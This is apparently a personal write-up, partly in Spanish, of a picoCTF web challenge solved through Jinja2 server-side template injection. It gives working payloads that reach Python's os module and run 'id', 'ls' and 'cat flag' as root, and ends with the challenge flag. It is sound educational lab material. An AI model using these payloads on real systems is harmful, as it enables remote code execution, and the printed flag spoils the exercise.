#Software #Hacking #WebExplotation #Web #Internet 
Hecho por: [[Yolanda Alejandra Sifuentes Flores]]
# Definición
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:62341/)!
# Hints
- Server Side Template Injection
# Solución
1. Ingresamos a la pagina web, y vemos que podemos publicar cosas.
2. Nos damos cuenta que aquí se pueden ejecutar códigos (como 7\*7 -ver más [aquí](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)-)
3. Así que decidimos probar suerte con este código
```javascript
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
Y vemos lo siguiente: uid=0(root) gid=0(root) groups=0(root)
4. Y funciona, por lo que adaptamos el comando a lo que ocupamos: [[ls]]
```javascript
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
Y nos muestra esto: \__pycache__ app.py flag requirements.txt
5. Finalmente extraemos la bandera con [[CAT]]
```javascript
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
## Respuesta
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}